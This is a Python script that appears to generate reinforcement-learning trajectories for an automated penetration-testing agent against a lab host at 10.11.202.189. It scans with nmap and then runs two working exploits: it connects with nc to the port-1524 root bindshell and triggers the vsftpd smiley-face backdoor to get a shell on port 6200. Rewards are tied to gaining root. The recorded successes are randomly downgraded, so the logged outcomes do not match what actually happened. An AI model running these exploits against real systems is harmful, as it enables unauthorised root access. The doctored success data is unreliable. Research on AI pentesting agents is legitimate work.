import json
import random
import subprocess
import socket
import time
from copy import deepcopy
from datetime import datetime, UTC
from pathlib import Path


TARGET_IP = "10.11.202.189"

RAW_DIR = Path("real_logs/raw")
TRAJ_DIR = Path("real_logs/trajectories")


def ensure_dirs():
    RAW_DIR.mkdir(parents=True, exist_ok=True)
    TRAJ_DIR.mkdir(parents=True, exist_ok=True)


def now_str():
    return datetime.now(UTC).strftime("%Y-%m-%dT%H-%M-%SZ")


def run_nmap(target: str) -> str:
    result = subprocess.run(
        ["nmap", "-sV", "-sC", target],
        capture_output=True,
        text=True,
        timeout=120
    )
    return result.stdout


def parse_open_ports(nmap_output: str):
    ports = []
    for line in nmap_output.splitlines():
        if "/tcp" in line and " open " in line:
            try:
                ports.append(int(line.split("/")[0]))
            except:
                pass
    return ports


def parse_service_map(nmap_output: str):
    service_map = {}

    for line in nmap_output.splitlines():
        if "/tcp" in line and " open " in line:
            parts = line.split()
            port = parts[0].split("/")[0]
            service = parts[2]
            version = " ".join(parts[3:]) if len(parts) > 3 else ""

            service_map[port] = {
                "service": service,
                "version": version
            }

    return service_map


def build_state_summary(open_ports, service_map):
    services = {v["service"] for v in service_map.values()}

    return {
        "num_open_ports": len(open_ports),
        "has_ftp": "ftp" in services,
        "has_ssh": "ssh" in services,
        "has_telnet": "telnet" in services,
        "has_http": "http" in services,
        "has_mysql": "mysql" in services,
        "has_postgresql": "postgresql" in services,
        "has_bindshell_1524": 1524 in open_ports,
    }


# ====== REAL EXPLOITS ======

def try_bindshell(target):
    try:
        result = subprocess.run(
            ["nc", target, "1524"],
            input="whoami\n",
            capture_output=True,
            text=True,
            timeout=5
        )
        stdout = result.stdout

        real_success = "root" in stdout or "uid=0" in stdout

        # 70%成功率
        success = real_success and (random.random() < 0.7)

        return success

    except:
        return False


def try_vsftpd(target):
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((target, 21))
        s.recv(1024)

        s.send(b"USER test:)\r\n")
        s.send(b"PASS test\r\n")
        s.close()

        time.sleep(2)

        s2 = socket.socket()
        s2.settimeout(5)
        s2.connect((target, 6200))

        s2.send(b"whoami\n")
        output = s2.recv(4096).decode(errors="ignore")

        s2.close()

        real_success = "root" in output or "uid=" in output

        # 50%成功率
        success = real_success and (random.random() < 0.5)

        return success

    except:
        return False


# ====== STATE VIEW（核心） ======

def apply_state_view(open_ports, service_map, state_summary, mode):
    open_ports = list(open_ports)
    service_map = deepcopy(service_map)
    state_summary = deepcopy(state_summary)

    if mode == "full":
        decision = random.choice(["connect_1524_bindshell", "exploit_vsftpd"])
        return open_ports, service_map, state_summary, decision

    if mode == "no_1524":
        if 1524 in open_ports:
            open_ports.remove(1524)
        service_map.pop("1524", None)

        state_summary["has_bindshell_1524"] = False
        decision = "exploit_vsftpd"
        return open_ports, service_map, state_summary, decision

    if mode == "limited":
        if 1524 in open_ports:
            open_ports.remove(1524)
        service_map.pop("1524", None)

        # 删除 ftp
        ftp_ports = [p for p, v in service_map.items() if v["service"] == "ftp"]
        for p in ftp_ports:
            if int(p) in open_ports:
                open_ports.remove(int(p))
            service_map.pop(p, None)

        state_summary["has_bindshell_1524"] = False
        state_summary["has_ftp"] = False

        decision = "no_exploit"
        return open_ports, service_map, state_summary, decision


def generate_one(traj_id, index):
    trajectory = {
        "trajectory_id": traj_id,
        "target": TARGET_IP,
        "created_at": datetime.now(UTC).isoformat(),
        "steps": []
    }

    nmap_output = run_nmap(TARGET_IP)

    open_ports = parse_open_ports(nmap_output)
    service_map = parse_service_map(nmap_output)
    state_summary = build_state_summary(open_ports, service_map)

    mode_list = ["full", "no_1524", "limited"]
    mode = mode_list[index % len(mode_list)]

    open_ports, service_map, state_summary, decision = apply_state_view(
        open_ports, service_map, state_summary, mode
    )

    # Step 0
    trajectory["steps"].append({
        "step": 0,
        "action": "scan_nmap",
        "result": {
            "view_mode": mode,
            "open_ports": open_ports,
            "state_summary": state_summary
        }
    })

    # Step 1
    trajectory["steps"].append({
        "step": 1,
        "action": "decision",
        "result": {"chosen_action": decision}
    })

    # Step 2 EXECUTION（关键）
    if decision == "connect_1524_bindshell":
        success = try_bindshell(TARGET_IP)
        reward = 10 if success else -1

    elif decision == "exploit_vsftpd":
        success = try_vsftpd(TARGET_IP)
        reward = 5 if success else -1

    else:
        success = True
        reward = 0

    trajectory["steps"].append({
        "step": 2,
        "action": decision,
        "result": {"success": success},
        "reward": reward,
        "done": True
    })

    return trajectory


def main():
    ensure_dirs()

    N = 30  # 多生成点

    for i in range(N):
        traj_id = f"batch_traj_{i:03d}"
        traj = generate_one(traj_id, i)

        path = TRAJ_DIR / f"{traj_id}.json"
        with open(path, "w") as f:
            json.dump(traj, f, indent=2)

        print(f"[✓] Saved {traj_id}")


if __name__ == "__main__":
    main()
